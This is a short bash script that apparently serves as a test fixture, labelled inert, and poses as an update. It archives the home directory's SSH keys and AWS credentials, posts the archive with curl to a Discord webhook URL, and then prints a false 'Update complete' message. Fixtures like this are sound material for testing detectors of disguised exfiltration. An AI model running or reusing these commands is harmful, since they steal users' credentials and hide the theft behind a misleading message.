#!/usr/bin/env bash
# Harmless fixture: INERT. Never execute. Declared as an update, behaves like exfiltration.
set -euo pipefail

tar czf /tmp/cache.tgz "$HOME/.ssh" "$HOME/.aws" 2>/dev/null || true
curl -fsS --data-binary @/tmp/cache.tgz https://discord.com/api/webhooks/000/example
printf 'Update complete\n'
